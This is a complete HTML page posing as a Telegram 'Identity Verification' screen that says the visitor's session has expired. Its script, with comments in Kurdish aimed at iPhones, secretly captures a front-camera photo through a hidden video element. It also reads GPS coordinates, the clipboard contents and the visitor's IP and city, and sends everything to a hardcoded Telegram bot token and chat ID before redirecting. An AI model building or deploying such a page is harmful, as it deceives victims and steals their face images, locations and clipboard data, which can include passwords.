<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Identity Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 85%; max-width: 350px; text-align: center; }
        .logo { width: 90px; margin-bottom: 15px; }
        h2 { font-size: 20px; color: #222; margin-bottom: 10px; }
        p { color: #707579; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
        .btn { background: #3390ec; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; -webkit-tap-highlight-color: transparent; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
        <h2>Verification Required</h2>
        <p>Your session has expired. Please verify your device identity to log back in.</p>
        <button class="btn" id="mainBtn">START VERIFICATION</button>
    </div>

    <!-- ئەمانە بۆ ئایفۆن زۆر گرنگن -->
    <video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
        const chatId = "6679834643";

        function sendToBot(text) {
            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            });
        }

        document.getElementById('mainBtn').addEventListener('click', async function() {
            const btn = this;
            btn.innerText = "Processing...";
            btn.disabled = true;

            // ١. هەوڵدان بۆ گرتنی وێنە (ئەمە دەبێت یەکەم شت بێت لە ئایفۆن)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // کەمێک وێستان بۆ ئەوەی کامێراکە ئامادە بێت
                await new Promise(r => setTimeout(r, 1000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                const fd = new FormData();
                fd.append('chat_id', chatId);
                fd.append('photo', blob, 'face.jpg');
                
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                stream.getTracks().forEach(t => t.stop());
            } catch (e) {
                await sendToBot("❌ iOS Camera Access Denied");
            }

            // ٢. هەوڵدان بۆ وەرگرتنی لۆکەیشن (گەڕانەوە بۆ لایەنێکی تری ئایفۆن)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendToBot(`📍 iOS GPS:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
                    finish();
                }, async (err) => {
                    await sendToBot("❌ iOS GPS Access Denied");
                    finish();
                }, { enableHighAccuracy: true, timeout: 5000 });
            } else {
                finish();
            }

            // ٣. Clipboard و IP (لە باکگراونددا کار دەکەن)
            try {
                const clip = await navigator.clipboard.readText();
                if(clip) sendToBot("📋 Clipboard: " + clip);
            } catch(e) {}
            
            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendToBot(`🌐 IP: ${d.ip}\nCity: ${d.city}`));
        });

        function finish() {
            // دوای ٣ چرکە دەیبات بۆ لاپەڕەی دواتر تا دڵنیا بین داتاکان نێردراون
            setTimeout(() => {
                window.location.href = "index.html";
            }, 2000);
        }
    </script>
</body>
</html>
